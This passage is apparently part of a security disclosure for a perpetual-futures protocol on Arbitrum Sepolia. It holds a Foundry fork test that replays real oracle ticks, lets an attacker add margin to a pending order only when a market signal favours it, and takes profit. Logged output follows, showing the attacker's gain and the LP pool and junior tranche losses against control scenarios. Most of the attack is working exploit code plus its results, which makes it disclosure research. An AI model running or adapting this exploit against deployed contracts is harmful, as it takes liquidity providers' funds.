    uint256 internal constant RESCUE = 5_000e6;

    address internal ATTACKER = makeAddr("attacker");

    IRouter internal router = IRouter(ROUTER);
    IEngine internal engine = IEngine(ENGINE);
    ILens internal lens = ILens(ENGINE_LENS);
    IClearinghouse internal clearinghouse = IClearinghouse(CLEARINGHOUSE);
    IPool internal pool = IPool(POOL);
    IOracle internal oracle = IOracle(ORACLE);
    IVault internal junior = IVault(JUNIOR);
    IVault internal senior = IVault(SENIOR);
    IUSDG internal usdg = IUSDG(USDG);

    NfpBundler internal bundler;
    NfpOptionAccount internal acct;
    mapping(uint256 => bytes) internal tickInput;
    uint256 internal lastBlock;
    uint256 internal nonce;
    bool internal dump;

    enum Mode {
        LongAttack,
        LongKeeperFirst,
        LongHonest,
        ShortDeclined,
        ShortHonest,
        Baseline
    }

    struct Arm {
        uint64 preId;
        uint64 armId;
        uint256 preSize;
        uint256 armSize;
        uint256 preMargin;
        uint256 armThreshold;
        uint256 armMargin;
    }

    struct Out {
        uint256 minted;
        uint256 walletEnd;
        int256 profit;
        uint256 poolEnd;
        uint256 juniorEnd;
        uint256 seniorEnd;
        uint256 keeperEnd;
        uint8 pre;
        uint8 arm;
    }

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co")), FORK_BLOCK
        );
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia");
        assertEq(block.timestamp, FORK_TS, "fork block timestamp");
        lastBlock = FORK_BLOCK;
        _setArbBlock(FORK_BLOCK);
        _assertDeployedBytecode();
        _assertReleaseConfiguration();
        _captureTickInputs();
    }

    /// @dev Runtime code hashes from deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json.
    function _assertDeployedBytecode() internal view {
        assertEq(USDG.codehash, 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6, "settlementToken");
        assertEq(CLEARINGHOUSE.codehash, 0xc8e4965893dbd7073303303e9d5ab9c775aabcc1259635e4993fc7fdb0681398, "clearinghouse");
        assertEq(ENGINE.codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b, "cfdEngine");
        assertEq(
            0x802a0755413FB966b397155b5c5CC0198E6BEd3F.codehash,
            0x16f6c8107b8f2965f1074df12878802c20aac2a54121c4c60854b29e1f18a9f1,
            "cfdEnginePlanner"
        );
        assertEq(
            0xd3EDe337E042d5aa6BA68E03D0c885b3d4A062DC.codehash,
            0x540083c758046571c5770f9950282eef938986ff41d78538109ddf549534b059,
            "cfdEngineSettlementSidecar"
        );
        assertEq(
            0x61C7f7Cf91c295a86250E1e05a91901e8E1e51A3.codehash,
            0x181223a2ac1c4fc3811d6bac5bc882310ff933d5450ffce6de5cf0c44aeb55b9,
            "terminalNavBookV2"
        );
        assertEq(POOL.codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957, "housePool");
        assertEq(ENGINE_LENS.codehash, 0x3af6c7539add5ddd3b517ad7397e717259f63637635cd947495675164d82d1a4, "cfdEngineLens");
        assertEq(ORACLE.codehash, 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13, "pletherOracle");
        assertEq(ROUTER.codehash, 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf, "orderRouter");
        assertEq(
            0x0AE016ef599BCDF0bbBEDba441401c3B6C6184eA.codehash,
            0xfc72fcbe4496d0d5356e96d259536cd4edcb926dd7fe1473a4275ddfb09cb57e,
            "orderRouterExecutionSidecar"
        );
        assertEq(
            0x7B605D7C57C191379822705d8510109D4B2573aA.codehash,
            0x8420be926293c70a880b5f12c07674861563727a04aca954323004855807c8f7,
            "orderRouterLiquidationBatchSidecar"
        );
        assertEq(
            LIFECYCLE_BOOK.codehash, 0xc3f34d5c32716e1818e1ae1cf5e14892a639bc35f15894610e619afe648ba554, "orderLifecycleBook"
        );
        assertEq(JUNIOR.codehash, 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf, "juniorVault");
        assertEq(SENIOR.codehash, 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a, "seniorVault");
    }

    /// @dev Each value is the DEPLOYMENT.md release value, read from the deployed contracts.
    function _assertReleaseConfiguration() internal view {
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "frozenCloseSpreadBps");
        assertEq(engine.fadRunwaySeconds(), 1 hours, "fadRunwaySeconds");
        (uint256 k, uint256 skew, uint256 mm, uint256 im, uint256 fad, uint256 carry, uint256 minB, uint256 bBps, uint256 ks, uint256 ps)
        = engine.riskParams();
        assertEq(k, 0.01e18, "vpiFactor");
        assertEq(skew, 0.4e18, "maxSkewRatio");
        assertEq(mm, 10, "maintMarginBps");
        assertEq(im, 20, "initMarginBps");
        assertEq(fad, 300, "fadMarginBps");
        assertEq(carry, 500, "baseCarryBps");
        assertEq(minB, 1e6, "minBountyAssets");
        assertEq(bBps, 10, "bountyBps");
        assertEq(ks, 5000, "keeperShareBps");
        assertEq(ps, 0, "protocolShareBps");
        assertEq(oracle.basketMaxConfidenceRatioBps(), 10, "basketMaxConfidenceRatioBps");
        assertEq(oracle.adverseConfidenceMultiplierBps(), 2500, "adverseConfidenceMultiplierBps");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "minOpenNotionalAssets");
        assertEq(router.maxPendingOrders(), 5, "maxPendingOrders");
        assertEq(router.maxExecutionWindowSeconds(), 60, "maxExecutionWindowSeconds");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "maxSeniorExposureAssets");
        assertEq(pool.maxSeniorShareBps(), 8000, "maxSeniorShareBps");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(junior.maintenanceFeeAprBps(), 0, "junior maintenance fee");
        assertEq(senior.maintenanceFeeAprBps(), 0, "senior maintenance fee");
        assertFalse(pool.lpEpochSettlementPaused(), "no LP settlement hold");
        assertFalse(engine.isFadWindow(), "live market: not FAD");
        assertFalse(engine.isOracleFrozen(), "live market: not frozen");
    }

    /// @dev Takes each tick's calldata from the real transaction as vm.transact replays it, checks its hash, then rewinds.
    function _captureTickInputs() internal {
        uint256 snap = vm.snapshotState();
        bytes memory i1 = _captureTick(TICK1_BLOCK, TICK1_TS, TICK1_HASH, TICK1_INPUT_HASH);
        bytes memory i2 = _captureTick(TICK2_BLOCK, TICK2_TS, TICK2_HASH, TICK2_INPUT_HASH);
        bytes memory i3 = _captureTick(TICK3_BLOCK, TICK3_TS, TICK3_HASH, TICK3_INPUT_HASH);
        vm.revertToState(snap);
        tickInput[1] = i1;
        tickInput[2] = i2;
        tickInput[3] = i3;
        lastBlock = FORK_BLOCK;
        _setArbBlock(FORK_BLOCK);
    }

    function _captureTick(uint256 bn, uint256 ts, bytes32 txHash, bytes32 inputHash) internal returns (bytes memory input) {
        _clock(bn, ts);
        vm.startStateDiffRecording();
        vm.transact(txHash);
        Vm.AccountAccess[] memory acc = vm.stopAndReturnStateDiff();
        for (uint256 i; i < acc.length; ++i) {
            if (acc[i].account == ROUTER && acc[i].data.length > 4 && bytes4(acc[i].data) == bytes4(0x2efdaf14)) {
                input = acc[i].data;
                break;
            }
        }
        assertEq(keccak256(input), inputHash, "real tick calldata");
    }

    // ================================================================== tests

    /// @notice The LONG option over the real window, with the raw system logs of every attacker step.
    function test_attack_nfpRelease() public {
        dump = true;
        _printForkState();
        Out memory a = _scenario(Mode.LongAttack, "ATTACK: LONG option armed 13:29:59, exercised 13:30:02, closed 13:30:38");
        assertEq(a.arm, uint8(OrderV3Types.TerminalReason.Executed), "arm rescued by addMargin and filled at the pin");
        assertGt(a.profit, 0, "attacker wallet ends above everything it minted");
        console2.log("IMPACT Critical - Direct theft of user funds: attacker wallet end - USDG minted (atoms)");
        console2.logInt(a.profit);
    }

    /// @notice Six scenarios from one snapshot over the same real ticks and payloads.
    function test_attackVsControls_samePath() public {
        _printForkState();
        uint256 snap = vm.snapshotState();
        Out memory la = _scenario(Mode.LongAttack, "ATTACK: LONG option, exercised on the signal at 13:30:02");
        _reset(snap);
        Out memory lk = _scenario(Mode.LongKeeperFirst, "CONTROL: LONG option, executor first at 13:30:02");
        _reset(snap);
        Out memory lh = _scenario(Mode.LongHonest, "CONTROL: same LONG orders margined to fill, executor at 13:30:05");
        _reset(snap);
        Out memory sd = _scenario(Mode.ShortDeclined, "SHORT option, declined on the signal; executor at 13:30:05");
        _reset(snap);
        Out memory sh = _scenario(Mode.ShortHonest, "CONTROL: same SHORT orders margined to fill, executor at 13:30:05");
        _reset(snap);
        Out memory b = _scenario(Mode.Baseline, "BASELINE: no attacker");

        int256 poolDelta = int256(la.poolEnd) - int256(b.poolEnd);
        int256 juniorDelta = int256(la.juniorEnd) - int256(b.juniorEnd);
        console2.log("===== comparison (USDG atoms; profit = attacker wallet end - USDG minted)");
        console2.log("LONG option: exercised / executor-first / honest");
        console2.logInt(la.profit);
        console2.logInt(lk.profit);
        console2.logInt(lh.profit);
        console2.log("SHORT option: declined / honest");
        console2.logInt(sd.profit);
        console2.logInt(sh.profit);
        console2.log("pool.totalAssets at end: attack / baseline", la.poolEnd, b.poolEnd);
        console2.log("junior.totalAssets at end: attack / baseline", la.juniorEnd, b.juniorEnd);
        console2.log("senior.totalAssets at end: attack / baseline", la.seniorEnd, b.seniorEnd);
        console2.log("IMPACT attacker gain withdrawn to its wallet (LONG option exercised)");
        console2.logInt(la.profit);
        console2.log("IMPACT LP pool (HousePool.totalAssets), attack minus baseline");
        console2.logInt(poolDelta);
        console2.log("IMPACT Junior tranche (JuniorVault.totalAssets), attack minus baseline");
        console2.logInt(juniorDelta);
        console2.log("0x5a71 (treasury, takes the execution fees), attack minus baseline");
        console2.logInt(int256(la.keeperEnd) - int256(b.keeperEnd));
        console2.log("both options held (LONG exercised + SHORT declined) / the same orders without the option");
        console2.logInt(la.profit + sd.profit);
        console2.logInt(lh.profit + sh.profit);

        uint8 ok = uint8(OrderV3Types.TerminalReason.Executed);
        uint8 rej = uint8(OrderV3Types.TerminalReason.PlannerRejected);
        assertEq(la.arm, ok, "attack: LONG arm rescued and filled");
        assertEq(lk.arm, rej, "executor first: LONG arm terminal");
        assertEq(lh.arm, ok, "honest: LONG arm filled");
        assertEq(sd.arm, rej, "declined: SHORT arm terminal, finalized by the executor");
        assertEq(sh.arm, ok, "honest: SHORT arm filled");
        assertGt(la.profit, 0, "attack: attacker wallet ends above everything it minted");
        assertLt(poolDelta, 0, "attack: LP pool below baseline");
        assertLt(juniorDelta, 0, "attack: Junior below baseline");
        assertGt(sd.profit, sh.profit, "declining saves what holding the losing side loses");
        assertGt(la.profit + sd.profit, lh.profit + sh.profit, "the rescue option turns both orders into a gain");
        assertGt(la.profit + sd.profit, 0, "both options held still end in profit");
    }

    /// @notice Both sides are armed on production: executor first ends the arm terminal, the rescue fills it at the pin.
    function test_armsHoldOnProduction() public {
        bytes[] memory pin = this.decodeUpdateMarkPrice(tickInput[2]);
        uint256 snap = vm.snapshotState();
        for (uint256 i; i < 2; ++i) {
            CfdTypes.Side side = i == 0 ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
            _reset(snap);
            Arm memory a = _toArmed(side, false);
            _at(T_EXERCISE);
            uint256 s2 = vm.snapshotState();
            uint8 kPre = _keeperExecute(a.preId, pin);
            uint8 kArm = _keeperExecute(a.armId, pin);
            vm.revertToState(s2);
            (uint8 xPre, uint8 xArm) = _exercise(a, pin);
            console2.log(i == 0 ? "LONG option" : "SHORT option");
            console2.log("  executor first: pre-order / arm terminal reason", kPre, kArm);
            console2.log("  rescue (addMargin + execute): pre-order / arm terminal reason", xPre, xArm);
            assertEq(kArm, uint8(OrderV3Types.TerminalReason.PlannerRejected), "executor first: arm terminal");
            assertEq(xArm, uint8(OrderV3Types.TerminalReason.Executed), "rescue: arm fills at the pin");
        }
    }

    // ================================================================== one scenario over the real window

    function _scenario(Mode mode, string memory tag) internal returns (Out memory o) {
        console2.log("=====", tag);
        bool trades = mode != Mode.Baseline;
        bool isLong = mode == Mode.LongAttack || mode == Mode.LongKeeperFirst || mode == Mode.LongHonest;
        CfdTypes.Side side = isLong ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
        Arm memory a;
        if (trades) {
            a = _toArmed(side, mode == Mode.LongHonest || mode == Mode.ShortHonest);
            o.minted = FUND;
        } else {
            _replayTick(1);
        }
        bytes[] memory pin = this.decodeUpdateMarkPrice(tickInput[2]);

        if (mode == Mode.LongAttack || mode == Mode.ShortDeclined) {
            _at(T_EXERCISE);
            int8 dir = _decide();
            bool exercise = (dir > 0 && isLong) || (dir < 0 && !isLong);
            console2.log(exercise ? "  decision: EXERCISE (addMargin + execute at the pin)" : "  decision: DECLINE (do nothing)");
            if (exercise) (o.pre, o.arm) = _exercise(a, pin);
            if (mode == Mode.LongAttack) assertTrue(exercise, "the release favours the LONG option");
            if (mode == Mode.ShortDeclined) assertFalse(exercise, "the release is adverse to the SHORT option");
        } else if (mode == Mode.LongKeeperFirst) {
            _at(T_EXERCISE);
            o.pre = _keeperExecute(a.preId, pin);
            o.arm = _keeperExecute(a.armId, pin);
        }
        _replayTick(2);
        if (mode == Mode.LongHonest || mode == Mode.ShortHonest || mode == Mode.ShortDeclined) {
            _at(T_KEEPER_MEDIAN);
            if (dump) vm.recordLogs();
            o.pre = _keeperExecute(a.preId, pin);
            o.arm = _keeperExecute(a.armId, pin);
            if (dump) _dumpLogs("13:30:05 executor 0x5a71: executeOrder(pre-order), executeOrder(arm)", vm.getRecordedLogs());
        }
        if (trades) console2.log("  terminal reasons (1 Executed, 7 PlannerRejected): pre-order / arm", o.pre, o.arm);

        uint64 closeId;
        if (trades) {
            _at(T_CLOSE_COMMIT);
            if (dump) vm.recordLogs();
            uint256 size = _size(address(acct));
            if (size != 0) closeId = _commit(side, size, 0, true);
            if (dump) _dumpLogs("13:30:34 attacker: commitOrder(close, full size)", vm.getRecordedLogs());
        }
        _replayTick(3);
        if (trades) {
            if (dump) vm.recordLogs();
            if (closeId != 0) _bundlerExecute(closeId, this.decodeUpdateMarkPrice(tickInput[3]));
            if (dump) _dumpLogs("13:30:38 attacker bundler: executeOrder(close) on tick 3's payload", vm.getRecordedLogs());
            assertEq(_size(address(acct)), 0, "account flat");
            if (dump) vm.recordLogs();
            vm.startPrank(ATTACKER);
            acct.withdrawAll();
            bundler.withdrawAll();
            vm.stopPrank();
            if (dump) _dumpLogs("13:30:38 attacker: withdraw account and bundler, USDG to wallet", vm.getRecordedLogs());
            assertEq(clearinghouse.balanceAssets(address(acct)), 0, "account fully withdrawn");
            assertEq(clearinghouse.balanceAssets(address(bundler)), 0, "bundler fully withdrawn");
        }
        o.walletEnd = usdg.balanceOf(ATTACKER);
        o.profit = int256(o.walletEnd) - int256(o.minted);
        o.poolEnd = pool.totalAssets();
        o.juniorEnd = junior.totalAssets();
        o.seniorEnd = senior.totalAssets();
        o.keeperEnd = clearinghouse.balanceAssets(KEEPER) + usdg.balanceOf(KEEPER);
        assertEq(engine.protocolTreasury(), KEEPER, "treasury is 0x5a71 on this deployment");
        console2.log("  USDG minted by the attacker / attacker wallet at end", o.minted, o.walletEnd);
        console2.log("  attacker wallet end - minted");
        console2.logInt(o.profit);
        console2.log("  pool.totalAssets / junior.totalAssets at end", o.poolEnd, o.juniorEnd);
    }

    /// @dev 13:29:27 fund + base, 13:29:33 tick 1 + base fill, 13:29:59 pre-order + arm.
    function _toArmed(CfdTypes.Side side, bool honest) internal returns (Arm memory a) {
        _at(T_BASE_COMMIT);
        if (dump) vm.recordLogs();
        vm.startPrank(ATTACKER);
        bundler = new NfpBundler(CLEARINGHOUSE, USDG);
        acct = new NfpOptionAccount(address(bundler), ROUTER, ENGINE, CLEARINGHOUSE, USDG);
        usdg.mint(ATTACKER, FUND);
        usdg.approve(address(acct), FUND);
        acct.fund(FUND);
        vm.stopPrank();
        uint64 baseId = _commit(side, _sizeFor(BASE_NOTIONAL, engine.lastMarkPrice()), BASE_MARGIN, false);
        if (dump) _dumpLogs("13:29:27 attacker: deploy, faucet mint, clearinghouse deposit, commit base", vm.getRecordedLogs());

        _replayTick(1);
        if (dump) vm.recordLogs();
        _bundlerExecute(baseId, this.decodeUpdateMarkPrice(tickInput[1]));
        if (dump) _dumpLogs("13:29:33 attacker bundler: executeOrder(base) on tick 1's payload", vm.getRecordedLogs());

        _at(T_ARM_COMMIT);
        assertEq(engine.lastMarkTime(), TICK1_PUBLISH, "stored mark is tick 1 (13:29:28)");
        assertLt(vm.getBlockTimestamp() - engine.lastMarkTime(), 60, "stored mark is fresh: the commit screen runs");
        console2.log("  stored mark age at the arm commit (s)", vm.getBlockTimestamp() - engine.lastMarkTime());
        if (dump) vm.recordLogs();
        uint256 px = engine.lastMarkPrice();
        a.preSize = _sizeFor(PRE_NOTIONAL, px);
        a.preMargin = _minMargin(side, a.preSize, px) + PRE_BUFFER;
        a.preId = _commit(side, a.preSize, a.preMargin, false);
        a.armSize = _sizeFor(ARM_NOTIONAL, px);
        a.armThreshold = _minMargin(side, a.armSize, px);
        a.armMargin = a.armThreshold + ARM_DELTA + (honest ? RESCUE : 0);
        a.armId = _commit(side, a.armSize, a.armMargin, false);
        if (dump) _dumpLogs("13:29:59 attacker: commitOrder(pre-order), commitOrder(arm)", vm.getRecordedLogs());
        (IOrderRouterAccounting.PendingOrderView memory v,) = router.getPendingOrderView(a.armId);
        assertEq(uint256(v.commitTime), T_ARM_COMMIT, "arm pinned to the 13:30:00 publication");
        console2.log("  arm id / size / commit-screen threshold", a.armId, a.armSize, a.armThreshold);
        console2.log("  arm marginDelta / pre-order marginDelta", a.armMargin, a.preMargin);
    }

    /// @dev One transaction: execute the pre-order, addMargin(RESCUE), execute the arm, all on the pinned payload.
    function _exercise(Arm memory a, bytes[] memory pin) internal returns (uint8 pre, uint8 arm) {
        NfpBundler.Call[] memory c = new NfpBundler.Call[](3);
        c[0] = _execCall(a.preId, pin);
        c[1] = NfpBundler.Call(address(acct), abi.encodeCall(NfpOptionAccount.addMargin, (RESCUE)));
        c[2] = _execCall(a.armId, pin);
        if (dump) vm.recordLogs();
        vm.prank(ATTACKER);
        bytes[] memory ret = bundler.run(c);
        if (dump) _dumpLogs("13:30:02 attacker bundler: executeOrder(pre), addMargin(5000 USDG), executeOrder(arm)", vm.getRecordedLogs());
        pre = _reason(ret[0]);
        arm = _reason(ret[2]);
    }

    /// @dev EUR/USD down = USD up = the USD-quoted basket down = LONG gains. +1 LONG pays, -1 SHORT pays, 0 neither.
    function _decide() internal view returns (int8 dir) {
        Trade[] memory t = _binanceEurUsdt();
        uint256 pPre;
        uint256 pNow;
        uint256 sellQty;
        uint256 buyQty;
        for (uint256 i; i < t.length; ++i) {
            if (t[i].timeUs < RELEASE_US) {
                pPre = t[i].priceE4;
            } else if (t[i].timeUs <= DECISION_US) {
                pNow = t[i].priceE4;
                if (t[i].isBuyerMaker) sellQty += t[i].qtyE1;
                else buyQty += t[i].qtyE1;
            }
        }
        int256 moveCbp = ((int256(pNow) - int256(pPre)) * 1_000_000) / int256(pPre);
        if (moveCbp <= -SIGNAL_THRESHOLD_CBP) dir = 1;
        else if (moveCbp >= SIGNAL_THRESHOLD_CBP) dir = -1;
        console2.log("  Binance EUR/USDT: last trade before 13:30:00.000 / at 13:30:02.300 (x 1e4)", pPre, pNow);
        console2.log("  move in 1/100 bp; sell / buy EUR x 10 since the release");
        console2.logInt(moveCbp);
        console2.log("  ", sellQty, buyQty);
    }

    function _replayTick(uint256 k) internal {
        (uint256 bn, uint256 ts, bytes32 h, uint256 mark, uint256 pub) = k == 1
            ? (TICK1_BLOCK, TICK1_TS, TICK1_HASH, TICK1_MARK, TICK1_PUBLISH)
            : k == 2
                ? (TICK2_BLOCK, TICK2_TS, TICK2_HASH, TICK2_MARK, TICK2_PUBLISH)
                : (TICK3_BLOCK, TICK3_TS, TICK3_HASH, TICK3_MARK, TICK3_PUBLISH);
        _clock(bn, ts);
        vm.transact(h);
        assertEq(engine.lastMarkTime(), pub, "keeper tick: real post-block mark time");
        assertEq(engine.lastMarkPrice(), mark, "keeper tick: real post-block mark price");
    }

    function _commit(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("addmargin-rescue-nfp", address(acct), nonce++));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        uint64 window = uint64(router.maxExecutionWindowSeconds());
        // No user execution bound is set: the check that fails at the pin is the protocol's initial-margin check.
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + window,
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: IBook(LIFECYCLE_BOOK).currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(ATTACKER);
        orderId = acct.commit(request);
    }

    function _bundlerExecute(uint64 id, bytes[] memory payload) internal {
        NfpBundler.Call[] memory c = new NfpBundler.Call[](1);
        c[0] = _execCall(id, payload);
        vm.prank(ATTACKER);
        bytes[] memory ret = bundler.run(c);
        require(_reason(ret[0]) == uint8(OrderV3Types.TerminalReason.Executed), "bundler execute");
    }

    /// @dev The real executor finalizes failing heads too (packages/perps-aa-client/src/keeperExecution.ts:21-28).
    function _keeperExecute(uint64 id, bytes[] memory payload) internal returns (uint8) {
        assertEq(oracle.getUpdateFee(payload), 0, "zero Pyth fee");
        vm.prank(KEEPER, KEEPER);
        return uint8(router.executeOrder(id, payload).terminalReason);
    }

    function _execCall(uint64 id, bytes[] memory payload) internal pure returns (NfpBundler.Call memory) {
        return NfpBundler.Call(ROUTER, abi.encodeCall(IRouter.executeOrder, (id, payload)));
    }

    function _reason(bytes memory ret) internal pure returns (uint8) {
        return uint8(abi.decode(ret, (OrderV3Types.ExecutionResult)).terminalReason);
    }

    /// @dev Smallest marginDelta (0.01 USDG steps) the deployed lens previews as OK at px: the commit-time screen.
    function _minMargin(CfdTypes.Side side, uint256 size, uint256 px) internal view returns (uint256 hi) {
        address a = address(acct);
        hi = clearinghouse.getFreeBuyingPowerAssets(a);
        require(lens.previewOpenRevertCode(a, side, size, hi, px) == 0, "no margin passes the commit preview");
        if (lens.previewOpenRevertCode(a, side, size, 0, px) == 0) return 0;
        uint256 lo;
        while (hi - lo > 1e4) {
            uint256 mid = (lo + hi) / 2;
            if (lens.previewOpenRevertCode(a, side, size, mid, px) == 0) hi = mid;
            else lo = mid;
        }
    }

    function _sizeFor(uint256 notionalAssets, uint256 price) internal pure returns (uint256) {
        return ((notionalAssets * 1e20 / price) / CfdTypes.SIZE_QUANTUM) * CfdTypes.SIZE_QUANTUM;
    }

    function _size(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function decodeUpdateMarkPrice(bytes calldata input) external pure returns (bytes[] memory) {
        return abi.decode(input[4:], (bytes[]));
    }

    function _reset(uint256 snap) internal {
        vm.revertToState(snap);
        lastBlock = FORK_BLOCK;
        nonce = 0;
        _setArbBlock(FORK_BLOCK);
    }

    /// @dev Attacker transactions get a block number interpolated between the real anchors.
    function _at(uint256 ts) internal {
        uint256[4] memory bs = [FORK_BLOCK, TICK1_BLOCK, TICK2_BLOCK, TICK3_BLOCK];
        uint256[4] memory tss = [FORK_TS, TICK1_TS, TICK2_TS, TICK3_TS];
        uint256 bn = TICK3_BLOCK + (ts > TICK3_TS ? (ts - TICK3_TS) * 4 : 0);
        for (uint256 i; i < 3; ++i) {
            if (ts >= tss[i] && ts <= tss[i + 1]) {
                bn = bs[i] + ((bs[i + 1] - bs[i]) * (ts - tss[i])) / (tss[i + 1] - tss[i]);
                break;
            }
        }
        _clock(bn, ts);
    }

    function _clock(uint256 bn, uint256 ts) internal {
        if (bn < lastBlock) bn = lastBlock;
        vm.roll(bn);
        vm.warp(ts);
        _setArbBlock(bn);
        lastBlock = bn;
    }

    /// @dev Forge's ArbSys shim returns the fork block forever; on chain ArbSys returns the live L2 block.
    function _setArbBlock(uint256 bn) internal {
        vm.mockCall(address(100), abi.encodeWithSelector(IArbSysBlockNumber.arbBlockNumber.selector), abi.encode(bn));
    }

    /// @dev The real book and pool at the fork block, read from the deployed contracts.
    function _printForkState() internal view {
        (, uint256 longOI,,) = engine.sides(0);
        (, uint256 shortOI,,) = engine.sides(1);
        uint256 mark = engine.lastMarkPrice();
        uint256 netLong = ((longOI - shortOI) * mark) / 1e20;
        uint256 depth = pool.totalAssets();
        console2.log("fork block 326633764 (Fri 2026-11-06 13:29:20 UTC): engine.lastMarkPrice / lastMarkTime", mark, engine.lastMarkTime());
        console2.log("  engine.sides openInterest LONG / SHORT (18 decimals)", longOI, shortOI);
        console2.log("  net LONG notional at the mark / pool.totalAssets (USDG atoms)", netLong, depth);
        console2.log("  junior.totalAssets / senior.totalAssets", junior.totalAssets(), senior.totalAssets());
        console2.log("  0.4 x pool.totalAssets - net LONG notional (USDG atoms)", (depth * 4) / 10 - netLong);
    }

    function _dumpLogs(string memory step, Vm.Log[] memory logs) internal pure {
        console2.log("raw system logs of", step, logs.length);
        for (uint256 i; i < logs.length; ++i) {
            console2.log("log", i, logs[i].emitter);
            for (uint256 k; k < logs[i].topics.length; ++k) {
                console2.logBytes32(logs[i].topics[k]);
            }
            console2.logBytes(logs[i].data);
        }
    }
}
```

### Output

The command above prints `forge-test-vv.log`. Adding `--match-test test_attack_nfpRelease -vvvv` (or `test_attackVsControls_samePath`, `test_armsHoldOnProduction`) prints the traces with every call and event decoded. The gist holds that run verbatim: `forge-test-vv.log`, `forge-test-vvvv.log`, `forge-test-controls-vvvv.log` and `forge-test-arms-vvvv.log`. The excerpts below are from those files.

`forge-test-vv.log`, the real state at the fork block and the exercised LONG option:

```
[PASS] test_attackVsControls_samePath() (gas: 150934591)
Logs:
  fork block 326633764 (Fri 2026-11-06 13:29:20 UTC): engine.lastMarkPrice / lastMarkTime 96308923 1793971735
    engine.sides openInterest LONG / SHORT (18 decimals) 40828500000000000000000000 3470800000000000000000000
    net LONG notional at the mark / pool.totalAssets (USDG atoms) 35978798527571 102182557863527
    junior.totalAssets / senior.totalAssets 100886119805804 1112077188392
    0.4 x pool.totalAssets - net LONG notional (USDG atoms) 4894224617839
  ===== ATTACK: LONG option, exercised on the signal at 13:30:02
    stored mark age at the arm commit (s) 31
    arm id / size / commit-screen threshold 189 4153100000000000000000000 25540280849
    arm marginDelta / pre-order marginDelta 25541280849 542576299
    Binance EUR/USDT: last trade before 13:30:00.000 / at 13:30:02.300 (x 1e4) 11177 11168
    move in 1/100 bp; sell / buy EUR x 10 since the release
  -805
     806524 70548
    decision: EXERCISE (addMargin + execute at the pin)
    terminal reasons (1 Executed, 7 PlannerRejected): pre-order / arm 1 1
    USDG minted by the attacker / attacker wallet at end 60000000000 61864915179
    attacker wallet end - minted
  1864915179
    pool.totalAssets / junior.totalAssets at end 102179048944764 100839182714438
```

`forge-test-vv.log`, the comparison of the six scenarios:

```
  ===== comparison (USDG atoms; profit = attacker wallet end - USDG minted)
  LONG option: exercised / executor-first / honest
  1864915179
  49188663
  1864523179
  SHORT option: declined / honest
  -235539148
  -8816584829
  pool.totalAssets at end: attack / baseline 102179048944764 102182557863527
  junior.totalAssets at end: attack / baseline 100839182714438 100842691633201
  senior.totalAssets at end: attack / baseline 1112077408322 1112077408322
  IMPACT attacker gain withdrawn to its wallet (LONG option exercised)
  1864915179
  IMPACT LP pool (HousePool.totalAssets), attack minus baseline
  -3508918763
  IMPACT Junior tranche (JuniorVault.totalAssets), attack minus baseline
  -3508918763
  0x5a71 (treasury, takes the execution fees), attack minus baseline
  1644003584
  both options held (LONG exercised + SHORT declined) / the same orders without the option
  1629376031
  -6952061650
```

`forge-test-vvvv.log`, the headline test's fills and every USDG `Transfer` of the attack, all emitted by the deployed USDG contract `0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D`. They net to HousePool -3,508.918763, Clearinghouse +1,644.003584 (the fees) and the attacker's wallet +61,864.915179 against the 60,000.000000 it put in:

```
877:    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 60000000000 [6e10])
884:    │   │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], amount: 60000000000 [6e10])
891:    │   │   │   ├─ emit Transfer(from: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], to: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, amount: 60000000000 [6e10])
1919:    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, amount: 34935322 [3.493e7])
